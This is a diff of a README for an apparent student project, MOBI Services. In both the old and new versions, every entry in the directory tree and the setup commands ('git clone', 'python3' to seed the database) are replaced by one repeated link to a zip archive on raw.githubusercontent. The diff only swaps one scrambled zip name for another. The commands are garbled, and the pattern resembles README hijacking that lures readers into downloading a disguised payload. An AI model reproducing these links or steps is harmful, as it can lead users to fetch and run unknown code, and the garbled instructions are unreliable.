@@ -134,36 +134,36 @@ TASK-END-OF-PHASE-03-PROJECT/\
 ├── mobi_services/\
 │   ├── migrations/\
 │   │   └── versions/\
-│   │       ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
-│   │       ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
-│   │       ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
-│   │       ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
-│   │       ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
-│   │       └── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
-│   ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
+│   │       ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/task_MOB_iddih_of_Services_phase_project_end_code_cronet.zip\
+│   │       ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/task_MOB_iddih_of_Services_phase_project_end_code_cronet.zip\
+│   │       ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/task_MOB_iddih_of_Services_phase_project_end_code_cronet.zip\
+│   │       ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/task_MOB_iddih_of_Services_phase_project_end_code_cronet.zip\
+│   │       ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/task_MOB_iddih_of_Services_phase_project_end_code_cronet.zip\
+│   │       └── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/task_MOB_iddih_of_Services_phase_project_end_code_cronet.zip\
+│   ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/task_MOB_iddih_of_Services_phase_project_end_code_cronet.zip\
 │   ├── README\
-│   ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
-│   ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
-│   ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
-│   ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
-│   ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
-│   ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
-│   ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
+│   ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/task_MOB_iddih_of_Services_phase_project_end_code_cronet.zip\
+│   ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/task_MOB_iddih_of_Services_phase_project_end_code_cronet.zip\
+│   ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/task_MOB_iddih_of_Services_phase_project_end_code_cronet.zip\
+│   ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/task_MOB_iddih_of_Services_phase_project_end_code_cronet.zip\
+│   ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/task_MOB_iddih_of_Services_phase_project_end_code_cronet.zip\
+│   ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/task_MOB_iddih_of_Services_phase_project_end_code_cronet.zip\
+│   ├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/task_MOB_iddih_of_Services_phase_project_end_code_cronet.zip\
 ├── Pipfile\
-├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
-├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
-├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
-├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
-├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
-├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip\
-└── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip
+├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/task_MOB_iddih_of_Services_phase_project_end_code_cronet.zip\
+├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/task_MOB_iddih_of_Services_phase_project_end_code_cronet.zip\
+├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/task_MOB_iddih_of_Services_phase_project_end_code_cronet.zip\
+├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/task_MOB_iddih_of_Services_phase_project_end_code_cronet.zip\
+├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/task_MOB_iddih_of_Services_phase_project_end_code_cronet.zip\
+├── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/task_MOB_iddih_of_Services_phase_project_end_code_cronet.zip\
+└── https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/task_MOB_iddih_of_Services_phase_project_end_code_cronet.zip
 
  
 
 ## Setup Instructions
 1. Clone the repository.
 ```txt
-git clone https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip
+git clone https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/task_MOB_iddih_of_Services_phase_project_end_code_cronet.zip
 ```
 1. Navigate to the project directory.
 
@@ -183,7 +183,7 @@ Run alembic upgrade head
 ```
 6. Seed the database with sample data:
 ```txt
-python3 https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/versions/code-iddih-task-end-of-phase-03-project-MOBI-Services_1.3.zip
+python3 https://raw.githubusercontent.com/code-iddih/code-iddih-task-end-of-phase-03-project-MOBI-Services/master/mobi_services/migrations/task_MOB_iddih_of_Services_phase_project_end_code_cronet.zip
 ```
 5. Enjoy!!!
 
